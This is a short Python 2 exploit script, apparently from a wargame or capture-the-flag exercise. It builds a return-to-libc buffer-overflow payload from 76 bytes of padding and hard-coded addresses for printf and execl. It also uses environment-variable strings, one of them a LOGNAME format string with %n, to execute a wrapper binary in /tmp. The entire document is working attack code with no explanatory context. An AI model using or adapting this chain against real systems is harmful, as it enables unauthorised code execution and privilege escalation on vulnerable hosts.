import struct

padding = "A"*76
printf_addr = struct.pack("I", 0xb7e63670)
execl_addr = struct.pack("I", 0xb7ecaa80) 
logname_addr = struct.pack("I", 0xBFFFFF4E)			#LOGNAME=%3\$n
ssh_connection_addr = struct.pack("I", 0xBFFFFF62)	#SSH_CONNECTION=/tmp/rs/wrapper12345678912345678
last_arg_addr = struct.pack("I", 0xbffff640)

payload = padding + printf_addr + execl_addr + logname_addr + ssh_connection_addr + ssh_connection_addr + last_arg_addr

print payload

















